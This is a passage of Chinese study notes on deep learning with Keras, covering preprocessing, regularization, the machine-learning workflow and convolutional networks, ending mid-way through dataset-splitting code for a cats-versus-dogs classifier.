title="神经网络的数据预处理"></a>神经网络的数据预处理</h3><p><strong>数据预处理的目的是使原始数据更适于用神经网络处理，包括向量化、标准化、处理缺失 值和特征提取</strong></p><ol><li>向量化：神经网络的所有输入和目标都必须是浮点数张量（在特定情况下可以是整数张量）。无论 处理什么数据（声音、图像还是文本），都必须首先将其转换为张量，这一步叫作<strong>数据向量化</strong>，例如，在前面两个文本分类的例子中，开始时文本都表示为整数列表（代 表单词序列），用 one-hot 编码将其转换为 float32 格式的张量。在手写数字分类和预 测房价的例子中，数据已经是向量形式，所以可以跳过这一步</li><li>值标准化，就是特征的标准化，对每个特征分别做标准化，使 其均值为 0、标准差为 1。一般来说，将取值相对较大的数据（比如多位整数，比网络权重的初始值大很多）或异质 数据（heterogeneous data，比如数据的一个特征在 0<del>1 范围内，另一个特征在 100</del>200 范围内） 输入到神经网络中是不安全的。输入数据应该具有以下特征：<ol><li>取值较小：大部分值都应该在 0~1 范围内。</li><li>同质性：所有特征的取值都应该在大致相同的范围内，</li><li>简单来说就是标准化，可以直接使用numpy数组完成：<code>x -= x.mean(axis=0)  x /= x.std(axis=0</code></li></ol></li><li>处理缺失值，一般来说，对于神经网络，将缺失值设置为 0 是安全的，只要 0 不是一个有意义的值。网 络能够从数据中学到 0 意味着缺失数据，并且会忽略这个值，如果测试数据中可能有缺失值，而网络是在没有缺失值的数据上训练的，那么网络 不可能学会忽略缺失值。在这种情况下，你应该人为生成一些有缺失项的训练样本：多次复制 一些训练样本，然后删除测试数据中可能缺失的某些特征</li><li>特征工程：是指将数据输入模型之前，利用你自己关于数据和机器学 习算法（这里指神经网络）的知识对数据进行硬编码的变换（不是模型学到的），以改善模型的 效果。多数情况下，一个机器学习模型无法从完全任意的数据中进行学习。呈现给模型的数据 应该便于模型进行学习</li></ol><p>幸运的是，对于现代深度学习，大部分特征工程都是不需要的，因为神经网络能够从原始 数据中自动提取有用的特征，<strong>但并不意味着特征工程就不再使用</strong>，良好的特征可以让你用更少的数据解决问题。深度学习模型自主学习特征的能力依赖于 大量的训练数据。如果只有很少的样本，那么特征的信息价值就变得非常重要。</p><h3 id="过拟合和欠拟合"><a href="#过拟合和欠拟合" class="headerlink" title="过拟合和欠拟合"></a>过拟合和欠拟合</h3><p>模型在<strong>留出验证数据上</strong>的性能总是在几轮后达到最高点，然后开始下降。也就是说，模型很快就在训练数据上开始<strong>过拟合</strong>。过拟合存在于所有机器学习问题中。学会如何处理过拟合对掌握机器学习至关重要</p><p>机器学习的根本问题是优化和泛化之间的对立，<strong>优化</strong>是指调节模型以在训 练数据上得到最佳性能（即机器学习中的学习），而<strong>泛化</strong>是指训练好的模型在 前所未见的数据上的性能好坏。</p><p>训练开始时，优化和泛化是相关的：训练数据上的损失越小，测试数据上的损失也越小。 这时的模型是欠拟合，即仍有改进的空间，网络还没有对训练数据中所有相关模 式建模。但在训练数据上迭代一定次数之后，泛化不再提高，验证指标先是不变，然后开始变差， 即模型开始过拟合。这时模型开始学习仅和训练数据有关的模式，但这种模式对新数据来说是 错误的或无关紧要的，为了防止模型从训练数据中学到错误或无关紧要的模式，最优解决方法是<strong>获取更多的训练 数据</strong>。次优解决方法是<strong>调节模型允许存储的信息量</strong>，或对<strong>模型允许存储的信息加以约束</strong>。如果一个网络只能记住几个 模式，那么优化过程会迫使模型集中学习最重要的模式，这样更可能得到良好的泛化。这种降低过拟合的方法叫作正则化</p><h4 id="减小网络大小"><a href="#减小网络大小" class="headerlink" title="减小网络大小"></a>减小网络大小</h4><p>防止过拟合的最简单的方法就是减小模型大小，<strong>即减少模型中可学习参数的个数</strong>，在深度学习中，模型中可学习参数的个数通常被称为模型的<strong>容量</strong>，深度学习模型通常都很擅长拟合训练数据，但真正的挑战在于泛化，而不是拟合，</p><p>使用的模型应 该具有足够多的参数，以防欠拟合，即模型应避免记忆资源不足。在容 量过大与容量不足之间要找到一个折中。</p><p>一般的工作流程是开始时选择相对较少的层和参数，然后逐渐增加层，的大小或增加新层，直到这种增加对验证损失的影响变得很小。</p><h4 id="添加权重正则化"><a href="#添加权重正则化" class="headerlink" title="添加权重正则化"></a>添加权重正则化</h4><p>给 定一些训练数据和一种网络架构，很多组权重值（即很多模型）都可以解释这些数据。简单模 型比复杂模型更不容易过拟合。</p><p>这里的简单模型是指参数值分布的熵更小的模型（或参数更少的模型，一种常见的降低过拟合的方法就是强制让模型权重只能取较小的值， 从而限制模型的复杂度，这使得权重值的分布更加规则，<strong>这种方法叫作权重正则化</strong>，其实现方法是向网络损失函数中添加与较大权重值相关的成本：</p><ul><li>L1 正则化：添加的成本与权重系数的绝对值［权重的 L1 范数］ 成正比。</li><li>L2 正则化：添加的成本与权重系数的平方（权重的 L2 范数）成正比。 神经网络的 L2 正则化也叫权重衰减（weight decay）。不要被不同的名称搞混，权重衰减 与 L2 正则化在数学上是完全相同的。、</li></ul><p>在 Keras 中，添加权重正则化的方法是向层传递权重正则化项实例，作为关键字参数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> keras <span class="token keyword">import</span> regularizersmodel <span class="token operator">=</span> models<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> kernel_regularizer<span class="token operator">=</span>regularizers<span class="token punctuation">.</span>l2<span class="token punctuation">(</span><span class="token number">0.001</span><span class="token punctuation">)</span><span class="token punctuation">,</span> activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">,</span> input_shape<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> kernel_regularizer<span class="token operator">=</span>regularizers<span class="token punctuation">.</span>l2<span class="token punctuation">(</span><span class="token number">0.001</span><span class="token punctuation">)</span><span class="token punctuation">,</span> activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> activation<span class="token operator">=</span><span class="token string">'sigmoid'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>l2(0.001) 的意思是该层权重矩阵的每个系数都会使网络总损失增加 0.001 * weight_ coefficient_value。注意，由于这个惩罚项只在训练时添加，所以这个网络的训练损失会 比测试损失大很多</p><p>还可以用 Keras 中以下这些权重正则化项来代替 L2 正则化:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> keras <span class="token keyword">import</span> regularizersregularizers<span class="token punctuation">.</span>l1<span class="token punctuation">(</span><span class="token number">0.001</span><span class="token punctuation">)</span> regularizers<span class="token punctuation">.</span>l1_l2<span class="token punctuation">(</span>l1<span class="token operator">=</span><span class="token number">0.001</span><span class="token punctuation">,</span> l2<span class="token operator">=</span><span class="token number">0.001</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="添加-dropout-正则化"><a href="#添加-dropout-正则化" class="headerlink" title="添加 dropout 正则化"></a>添加 dropout 正则化</h4><p>dropout 是神经网络最有效也最常用的正则化方法之一，对某一层使用 dropout，就是在训练过程中随机将该层的一些输出特征舍 弃（设置为 0）。dropout 比率（dropout rate）是被设为 0 的特征所占的比例，通常在 0.2~0.5 范围内。测试时没有单元被舍弃，而该层的输出值需要按 dropout 比率缩小，因为这时比训练时 有更多的单元被激活，需要加以平衡</p><p>总结一下，防止神经网络过拟合的常用方法包括：</p><ul><li><p>获取更多的训练数据 </p></li><li><p>减小网络容量  </p></li><li><p>添加权重正则化 </p></li><li><p>添加 dropout</p></li></ul><p>这是向神经网络中添加dropout层的示例</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">model <span class="token operator">=</span> models<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">,</span> input_shape<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dropout<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dropout<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> activation<span class="token operator">=</span><span class="token string">'sigmoid'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="机器学习通用流程"><a href="#机器学习通用流程" class="headerlink" title="机器学习通用流程"></a>机器学习通用流程</h3><ol><li><p>定义问题，收集数据，只有明确了输入、输出以及所使用的数据，你才能进入下一阶段。注意在这一阶段所做 的假设，假设输出是可以根据输入进行预测的。假设可用数据包含足够多的信息，足以学习输入和输出之间的关系。在开发出工作模型之前，这些只是假设，等待验证真假。并非所有问题都可以解决。你收 集了包含输入 X 和目标 Y 的很多样例，并不意味着 X 包含足够多的信息来预测 Y。</p></li><li><p>选择衡量成功的指标，衡量成功的指标将指引你选择损失函数，即 模型要优化什么。它应该直接与你的目标（如业务成功）保持一致。</p></li><li><p>确定评估方法，一旦明确了目标，你必须确定如何衡量当前的进展。前面介绍了三种常见的评估方法</p><ol><li>留出验证集。数据量很大时可以采用这种方法</li><li>K 折交叉验证。如果留出验证的样本量太少，无法保证可靠性，那么应该选择这种方法</li><li>重复的 K 折验证。如果可用的数据很少，同时模型评估又需要非常准确，那么应该使用 这种方法。</li><li>只需选择三者之一。大多数情况下，第一种方法足以满足要求</li></ol></li><li><p>准备数据，首先你应该将数据格式化，使其可以输入到机器学习模型中（这里假设模型为深度神经网络）</p><ol><li>如前所述，应该将数据格式化为张量</li><li>这些张量的取值通常应该缩放为较小的值，比如在 [-1, 1] 区间或 [0, 1] 区间。</li><li>如果不同的特征具有不同的取值范围（异质数据），那么应该做数据标准化</li><li>可能需要做特征工程，尤其是对于小数据问题</li></ol></li><li><p>开发比基准更好的模型，这一阶段的目标是获得统计功效（statistical power），即开发一个小型模型，它能够打败纯 随机的基准，不一定总是能获得统计功效。如果你尝试了多种合理架构之后仍然无法打败随机基准， 那么原因可能是问题的答案并不在输入数据中，要记住所做的两个假设：</p><ol><li>假设输出是可以根据输入进行预测的。</li><li>假设可用的数据包含足够多的信息，足以学习输入和输出之间的关系</li><li>还需要选择三个关键参数来构建第一个工作模型<ol><li><strong>最后一层的激活</strong>。它对网络输出进行有效的限制。例如，IMDB 分类的例子在最后一层 使用了 sigmoid，回归的例子在最后一层没有使用激活，等等</li><li><strong>损失函数。</strong>它应该匹配你要解决的问题的类型。例如，IMDB 的例子使用 binary_ crossentropy、回归的例子使用 mse，等等</li><li><strong>优化配置。</strong>你要使用哪种优化器？学习率是多少？大多数情况下，使用 rmsprop 及其 默认的学习率是稳妥的</li></ol></li></ol><p>关于损失函数的选择，需要注意，直接优化衡量问题成功的指标不一定总是可行的。有时 难以将指标转化为损失函数，要知道，损失函数需要在只有小批量数据时即可计算,而且还必须是可微的（否则无法用反向 传播来训练网络）。例如，广泛使用的分类指标 ROC AUC 就不能被直接优化。因此在分类任务 中，常见的做法是优化 ROC AUC 的替代指标，比如交叉熵。一般来说，你可以认为交叉熵越小， ROC AUC 越大</p><p><img src="/images/image-20210401145056560.png" alt="选择激活与损失函数"></p></li><li><p><strong>扩大模型规模：开发过拟合的模型</strong>,一旦得到了具有统计功效的模型，问题就变成了：模型是否足够强大？它是否具有足够多 的层和参数来对问题进行建模？例如，只有单个隐藏层且只有两个单元的网络，在 MNIST 问题 上具有统计功效，但并不足以很好地解决问题。请记住，机器学习中无处不在的对立是优化和 泛化的对立，理想的模型是刚好在欠拟合和过拟合的界线上，要搞清楚你需要多大的模型<strong>，就必须开发一个过拟合的模型，</strong></p><ol><li><strong>添加更多的层</strong></li><li><strong>让每一层变得更大</strong></li><li><strong>训练更多的轮次</strong></li><li>要始终监控训练损失和验证损失，以及你所关心的指标的训练值和验证值。如果你发现模 型在验证数据上的性能开始下降，那么就出现了过拟合</li><li>下一阶段将开始正则化和调节模型，以便尽可能地接近理想模型，既不过拟合也不欠拟合</li></ol></li><li><p><strong>模型正则化与调节超参数</strong>,这一步是最费时间的：你将不断地调节模型、训练、在验证数据上评估（这里不是测试数据）、 再次调节模型，然后重复这一过程，直到模型达到最佳性能,应该尝试以下几项:</p><ol><li>添加 dropout</li><li>尝试不同的架构：增加或减少层数</li><li>添加 L1 和 / 或 L2 正则化</li><li>尝试不同的超参数（比如每层的单元个数或优化器的学习率），以找到最佳配置</li><li>反复做特征工程：添加新特征或删除没有信息量的特征</li><li>每次使用验证过程的反馈来调节模型，都会将有关验证过程的信息泄露到模型中。 如果只重复几次，那么无关紧要；但如果系统性地迭代许多次，最终会导致模型对验证过程过 拟合.这会降低验证过程的可靠性。</li></ol></li></ol><h2 id="深度学习用于计算机视觉"><a href="#深度学习用于计算机视觉" class="headerlink" title="深度学习用于计算机视觉"></a>深度学习用于计算机视觉</h2><p>深度学习在视觉上的应用主要是基于卷积神经网络，</p><h3 id="卷积神经网络"><a href="#卷积神经网络" class="headerlink" title="卷积神经网络"></a>卷积神经网络</h3><p>卷积神经网络，convnet，CNN，下面是一个简单的CNN模型搭建：</p><p><img src="/images/image-20210401155404876.png"></p><p>重要的是，卷积神经网络接收形状为 (image_height, image_width, image_channels) 的输入张量（不包括批量维度）。本例中设置卷积神经网络处理大小为 (28, 28, 1) 的输入张量， 这正是 MNIST 图像的格式。我们向第一层传入参数 input_shape=(28, 28, 1) 来完成此设置</p><p>可以看模型的summary</p><p><img src="/images/image-20210401161738026.png"></p><p>可以看到，每个 Conv2D 层和 MaxPooling2D 层的输出都是一个形状为 (height, width,  channels) 的 3D 张量。宽度和高度两个维度的尺寸通常会随着网络加深而变小。通道数量由传 入 Conv2D 层的第一个参数所控制（32 或 64）。    </p><p>下一步是将最后的输出张量［大小为 (3, 3, 64)］输入到一个密集连接分类器网络中， 即 Dense 层的堆叠，</p><p>这些分类器可以处理 1D 向量，而当前的输出是 3D 张量。 首先，我们需要将 3D 输出展平为 1D，然后在上面添加几个 Dense 层：</p><p><img src="/images/image-20210401162129258.png"></p><p>这里Flatten()层的用法就是用来将输入“压平”，即把多维的输入一维化，常用在从卷积层到全连接层的过渡。Flatten不影响batch的大小。</p><p><img src="/images/image-20210402081716958.png"></p><p>在进入两个 Dense 层之前，形状 (3, 3, 64) 的输出被展平为形状 (576,) 的 向量。</p><p>密集连接层和卷积层的根本区别在于，Dense 层从输入特征空间中学到的是全局模式，而卷积层学到的是<strong>局部模式</strong>，对于图像来说，学到的就是在输入图像的二维小窗口中发现的模式</p><p><img src="/images/image-20210402090626818.png"></p><p>这个重要特性使卷积神经网络具有以下两个有趣的性质：</p><ol><li>卷积神经网络学到的模式具有平移不变性，卷积神经网络在图像 右下角学到某个模式之后，它可以在任何地方识别这个模式，比如左上角。对于密集连 接网络来说，如果模式出现在新的位置，它只能重新学习这个模式。这使得卷积神经网 络在处理图像时可以高效利用数据（因为视觉世界从根本上具有平移不变性），它只需 要更少的训练样本就可以学到具有泛化能力的数据表示。</li><li>卷积神经网络可以学到模式的空间层次结构,第一个卷积层将学习较小的局部模式（比如边缘），第二个卷积层将学习由第一层特征 组成的更大的模式，以此类推。这使得卷积神经网络可以有效地学习越来越复杂、越来 越抽象的视觉概念（因为视觉世界从根本上具有空间层次结构）</li></ol><p>对于包含两个空间轴（高度和宽度）和一个深度轴（也叫通道轴）的 3D 张量，其卷积也 叫<strong>特征图</strong>,对于 RGB 图像，深度轴的维度大小等于 3，因为图像有 3 个颜色通道： 红色、绿色和蓝色,对于黑白图像（比如 MNIST 数字图像），深度等于 1（表示灰度等级）,卷 积运算从输入特征图中提取图块，并对所有这些图块应用相同的变换，生成输出特征图,该输出特征图仍是一个 3D 张量，具有宽度和高度，其深度可以任意取值，因为 输出深度是层的参数，深度轴的不同通道不再像 RGB 输入那样代表特定颜色，而是代表过滤器，过滤器对输入数据的某一方面进行编码</p><p>MNIST 示例中，第一个卷积层接收一个大小为 (28, 28, 1) 的特征图，并输出一个大 小为 (26, 26, 32) 的特征图，即它在输入上计算 32 个过滤器。对于这 32 个输出通道，每个 通道都包含一个 26×26 的数值网格，它是过滤器对输入的响应图，表示这个过 滤器模式在输入中不同位置的响应，这也是特征图这一术语的含义：深度轴的每个 维度都是一个特征（或过滤器），而 2D 张量 output[:, :, n] 是这个过滤器在输入上的响应 的二维空间图</p><p><img src="/images/image-20210402102350289.png"></p><p><strong>卷积由以下两个关键参数所定义：</strong></p><ol><li>从输入中提取的图块尺寸：这些图块的大小通常是 3×3 或 5×5。</li><li>输出特征图的深度：卷积所计算的过滤器的数量。</li></ol><p><strong>对于 Keras 的 Conv2D 层，这些参数都是向层传入的前几个参数：Conv2D(output_depth,  (window_height, window_width))。</strong></p><p><strong>卷积的工作原理：在 3D 输入特征图上滑动（slide）这些 3×3 或 5×5 的窗口，在每个可能 的位置停止并提取周围特征的 3D 图块［形状为 (window_height, window_width, input_ depth)］。然后每个 3D 图块与学到的同一个权重矩阵［叫作卷积核]做 张量积，转换成形状为 (output_depth,) 的 1D 向量,然后对所有这些向量进行空间重组， 使其转换为形状为 (height, width, output_depth) 的 3D 输出特征图。输出特征图中的 每个空间位置都对应于输入特征图中的相同位置</strong></p><p><img src="/images/image-20210402110017363.png"></p><ul><li><strong>边界效应与填充</strong></li></ul><p>假设有一个 5×5 的特征图（共 25 个方块）。其中只有 9 个方块可以作为中心放入一个 3×3 的窗口，这 9 个方块形成一个 3×3 的网格（见图 5-5）。因此，输出特征图的尺寸是 3×3。 它比输入尺寸小了一点,如果你希望输出特征图的空间维度与输入相同，那么可以使用填充（padding）。填充是在 输入特征图的每一边添加适当数目的行和列，使得<strong>每个输入方块都能作为卷积窗口的中心</strong></p><p>于 3×3 的窗口，在左右各添加一列，在上下各添加一行。对于 5×5 的窗口，各添加两行和两列</p><p><strong>对于 Conv2D 层，可以通过 padding 参数来设置填充，这个参数有两个取值：”valid” 表 示不使用填充（只使用有效的窗口位置）；”same” 表示“填充后输出的宽度和高度与输入相同”。 padding 参数的默认值为 “valid”</strong></p><ul><li>卷积步幅</li></ul><p>影响输出尺寸的另一个因素是步幅的概念。目前为止，对卷积的描述都假设卷积窗口的中 心方块都是相邻的。但两个连续窗口的距离是卷积的一个参数，叫作步幅，默认值为 1，也可 以使用步进卷积，即步幅大于 1 的卷积步幅为 2 意味着特征图的宽度和高度都被做了 2 倍下采样（除了边界效应引起的变化）。虽 然步进卷积对某些类型的模型可能有用，但在实践中很少使用，为了对特征图进行下采样，我们不用步幅，而是通常使用最大池化</p><ul><li>最大池化运算</li></ul><p><strong>在每个 MaxPooling2D 层之后，特征图的尺寸都 会减半</strong>，最大池化的作用：对特征图进行下采样，与步进卷积类似，<strong>最大池化是从输入特征图中提取窗口，并输出每个通道的最大值</strong>，但是最大池化使用硬编码的 max 张量运算对局部图块进行变换，而不是使用学到的线性变换,最大池化与卷积的最大不同之处在于，最大池化通常使用 2×2 的窗口和步幅 2，其目 的是将特征图<strong>下采样</strong> 2 倍。与此相对的是，卷积通常使用 3×3 窗口和步幅 1</p><p>简而言之，使用下采样的原因，一是减少需要处理的特征图的元素个数，二是通过让连续 卷积层的观察窗口越来越大（即窗口覆盖原始输入的比例越来越大），从而引入空间过滤器的层 级结构。</p><h3 id="小型卷积神经网络的搭建"><a href="#小型卷积神经网络的搭建" class="headerlink" title="小型卷积神经网络的搭建"></a>小型卷积神经网络的搭建</h3><p>这里用一个猫狗分类的模型来进行示例，完整展示开发流程：</p><p>首先是对数据集的处理：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_pic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"划分训练集测试集"</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> <span class="token string">'./data/dogs-vs-cats/train'</span>    main_path <span class="token operator">=</span> <span class="token string">'./data/dvsc'</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>main_path<span class="token punctuation">)</span>    <span class="token comment">#训练数据集划分</span>    trian_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>main_path<span class="token punctuation">,</span><span class="token string">'train'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>trian_dir<span class="token punctuation">)</span>    <span class="token comment">#测试集</span>    test_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>main_path<span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>test_dir<span class="token punctuation">)</span>    <span class="token comment">#验证集</span>    val_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>main_path<span class="token punctuation">,</span><span class="token string">'val'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>val_dir<span class="token punctuation">)</span>    <span class="token comment">#分别训练集</span>    train_cat_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>trian_dir<span class="token punctuation">,</span><span class="token string">'cat'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>train_cat_dir<span class="token punctuation">)</span>    train_dog_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>trian_dir<span class="token punctuation">,</span><span class="token string">'dog'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>train_dog_dir<span class="token punctuation">)</span>    <span class="token comment">#分别测试集</span>    test_cat_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>test_dir<span class="token punctuation">,</span><span class="token string">'cat'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>test_cat_dir<span class="token punctuation">)</span>    test_dog_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>test_dir<span class="token punctuation">,</span><span class="token string">'dog'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>test_dog_dir<span class="token punctuation">)</span>    <span class="token comment">#分别验证集</span>    val_cat_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>val_dir<span class="token punctuation">,</span><span class="token string">'cat'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>val_cat_dir<span class="token punctuation">)</span>    val_dog_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>val_dir<span class="token punctuation">,</span><span class="token string">'dog'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>val_dog_dir<span class="token punctuation">)</span>    <span class="token comment">#复制图片到对应目录</span>    <span class="token comment">#猫训练1000张</span>    fnames<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'cat.&#123;&#125;.jpg'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> fname <span class="token keyword">in</span> fnames<span class="token punctuation">:</span>        src <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>path<span class="token punctuation">,</span>fname<span class="token punctuation">)</span>        <span class="token builtin">dir</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>train_cat_dir<span class="token punctuation">,</span>fname<span class="token punctuation">)</span>        shutil<span class="token punctuation">.</span>copyfile<span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token builtin">dir</span><span class="token punctuation">)</span>    <span class="token comment">#狗训练1000张</span>    fnames<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'dog.&#123;&#125;.jpg'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> fname <span class="token keyword">in</span> fnames<span class="token punctuation">:</span>        src <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>path<span class="token punctuation">,</span>fname<span class="token punctuation">)</span>        <span class="token builtin">dir</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>train_dog_dir<span class="token punctuation">,</span>fname<span class="token punctuation">)</span>        shutil<span class="token punctuation">.</span>copyfile<span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token builtin">dir</span><span class="token punctuation">)</span>    <span class="token comment">#猫测试500张</span>    fnames<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'cat.&#123;&#125;.jpg'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">1500</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> fname <span class="token keyword">in</span> fnames<span class="token punctuation">:</span>        src <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>path<span class="token punctuation">,</span>fname<span class="token punctuation">)</span>        <span class="token builtin">dir</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>test_cat_dir<span class="token punctuation">,</span>fname<span class="token punctuation">)</span>        shutil<span class="token punctuation">.</span>copyfile<span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token builtin">dir</span><span class="token punctuation">)</span>    <span class="token comment">#狗测试500张</span>    fnames<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'dog.&#123;&#125;.jpg'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">1500</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> fname <span class="token keyword">in</span> fnames<span class="token punctuation">:</span>        src <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>path<span class="token punctuation">,</span>fname<span class="token punctuation">)</span>        <span class="token builtin">dir</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>test_dog_dir<span class="token punctuation">,</span>fname<span class="token punctuation">)</span>        shutil<span class="token punctuation">.</span>copyfile<span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token builtin">dir</span><span class="token punctuation">)</span>    <span class="token comment">#猫验证500</span>    fnames<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'cat.&#123;&#125;.jpg'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> fname <span class="token keyword">in</span> fnames<span class="token punctuation">:</span>        src <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token 